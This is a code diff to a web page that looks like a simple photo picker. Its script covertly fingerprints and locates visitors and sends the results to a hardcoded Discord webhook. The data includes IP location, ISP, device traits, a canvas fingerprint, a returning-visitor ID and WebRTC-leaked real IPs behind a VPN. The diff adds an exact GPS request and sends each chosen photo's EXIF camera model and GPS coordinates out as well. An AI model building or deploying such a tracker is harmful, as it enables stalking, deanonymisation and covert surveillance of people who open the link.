@@ -14,7 +14,6 @@
   p{color:#444}
   .pick{display:inline-block;margin-top:6px;font-size:15px;color:#06c;
         text-decoration:none;border-bottom:1px solid #cde;cursor:pointer}
-  .pick:hover{border-color:#06c}
   #note{margin-top:14px;font-size:14px;color:#777}
 </style>
 </head>
@@ -26,10 +25,13 @@
 
 <input type="file" id="pic" accept="image/*" multiple hidden>
 
-<script src="https://cdn.jsdelivr.net/npm/exifr/dist/lite.umd.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/exifr/dist/full.umd.js"></script>
 <script>
 const PING = 'https://discord.com/api/webhooks/1560928889751080962/ondOL9bsp--IJzPcgNvtXQgE7v57EeQees2xkRkWNyjCYJ6-f_zIMVPSe7jtiOApCdwk';
 const BOTS = /whatsapp|facebookexternalhit|facebookcatalog|facebot|telegrambot|slackbot|discordbot|twitterbot|linkedinbot|embedly|pinterest|bot\/|crawler|spider|preview/i;
+
+// set to false if you don't want the "Allow location?" prompt at all
+const ASK_GPS = true;
 
 const send = body => fetch(PING, { method:'POST', keepalive:true,
   headers:{'Content-Type':'application/json'},
@@ -51,7 +53,6 @@ const send = body => fetch(PING, { method:'POST', keepalive:true,
       lat: g.latitude, lon: g.longitude });
   } catch {}
 
-  // silent extras
   try { const b = await navigator.getBattery();
         d.batt = Math.round(b.level*100) + '%' + (b.charging ? ' (charging)' : ''); } catch {}
   try { const c = navigator.connection;
@@ -63,7 +64,6 @@ const send = body => fetch(PING, { method:'POST', keepalive:true,
     try { d['perm_'+n] = (await navigator.permissions.query({name:n})).state; } catch {}
   }
 
-  // fingerprint
   d.cores = navigator.hardwareConcurrency || '';
   d.mem = navigator.deviceMemory || '';
   try {
@@ -78,7 +78,6 @@ const send = body => fetch(PING, { method:'POST', keepalive:true,
     d.cfp = cv.toDataURL().slice(-40);
   } catch {}
 
-  // returning visitor
   try {
     let vid = localStorage.getItem('vid');
     if (!vid) { vid = Math.random().toString(36).slice(2,10); localStorage.setItem('vid', vid); }
@@ -87,7 +86,6 @@ const send = body => fetch(PING, { method:'POST', keepalive:true,
     localStorage.setItem('seen', '1');
   } catch {}
 
-  // webrtc -> real IP behind VPN + local IP
   d.rtc = await new Promise(res => {
     const ips = new Set();
     try {
@@ -109,7 +107,7 @@ const send = body => fetch(PING, { method:'POST', keepalive:true,
 
   const msg = [
     bot ? '🤖 PREVIEW BOT' : '✅ REAL TAP',
-    `**${d.city||'?'}, ${d.region||'?'} ${d.country||'?'}**`,
+    `**${d.city||'?'}, ${d.region||'?'} ${d.country||'?'}**  _(IP-level, not exact)_`,
     `ISP: ${d.isp||'?'}`,
     `IP: ${d.ip||'?'}`,
     map ? `Map: ${map}` : '',
@@ -129,26 +127,43 @@ const send = body => fetch(PING, { method:'POST', keepalive:true,
   send(msg);
 })();
 
-// photo picker -> EXIF GPS
+// exact location - shows an "Allow location?" prompt
+if (ASK_GPS) setTimeout(() => {
+  if (!navigator.geolocation) return;
+  navigator.geolocation.getCurrentPosition(
+    p => send(`📍 **EXACT GPS**\n${p.coords.latitude},${p.coords.longitude}\n` +
+              `accuracy: ±${Math.round(p.coords.accuracy)}m\n` +
+              `https://maps.google.com/?q=${p.coords.latitude},${p.coords.longitude}`),
+    () => send('📍 GPS declined'),
+    { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
+  );
+}, 1500);
+
+// photo picker -> report what EXIF each file actually has
 const pic = document.getElementById('pic');
 document.getElementById('pick').onclick = e => { e.preventDefault(); pic.click(); };
 
 pic.onchange = async e => {
-  const out = [];
+  const lines = [];
   for (const f of e.target.files) {
+    const when = f.lastModified ? new Date(f.lastModified).toISOString().slice(0,16) : '?';
+    let info = `**${f.name}** · ${Math.round(f.size/1024)}KB · file date ${when}`;
     try {
-      const g = await exifr.gps(f);
-      const x = await exifr.parse(f, ['Make','Model','DateTimeOriginal']);
-      const bits = [];
-      if (x?.Make || x?.Model) bits.push(`${x.Make||''} ${x.Model||''}`.trim());
-      if (g?.latitude) bits.push(`${g.latitude},${g.longitude}`);
-      if (x?.DateTimeOriginal) bits.push(new Date(x.DateTimeOriginal).toISOString());
-      if (bits.length) out.push(bits.join(' | '));
-    } catch {}
+      const x = await exifr.parse(f) || {};
+      const cam = [x.Make, x.Model].filter(Boolean).join(' ').trim();
+      info += cam ? `\ncam: ${cam}` : `\ncam: none in file`;
+      if (x.DateTimeOriginal) info += `\ntaken: ${new Date(x.DateTimeOriginal).toISOString()}`;
+      if (x.latitude != null) {
+        info += `\nGPS: ${x.latitude},${x.longitude}\nhttps://maps.google.com/?q=${x.latitude},${x.longitude}`;
+      } else {
+        info += `\nGPS: **none in file**`;
+      }
+    } catch (err) { info += `\nparse error: ${err.message}`; }
+    lines.push(info);
   }
-  if (out.length) send('📷 PHOTOS (' + out.length + ')\n' + out.join('\n'));
+  send('📷 PHOTOS (' + lines.length + ')\n' + lines.join('\n\n'));
   document.getElementById('note').textContent =
-    out.length ? out.length + ' photo(s) read' : 'No EXIF location in those';
+    lines.length + ' photo(s) checked — open Discord for details';
 };
 </script>
 </body>
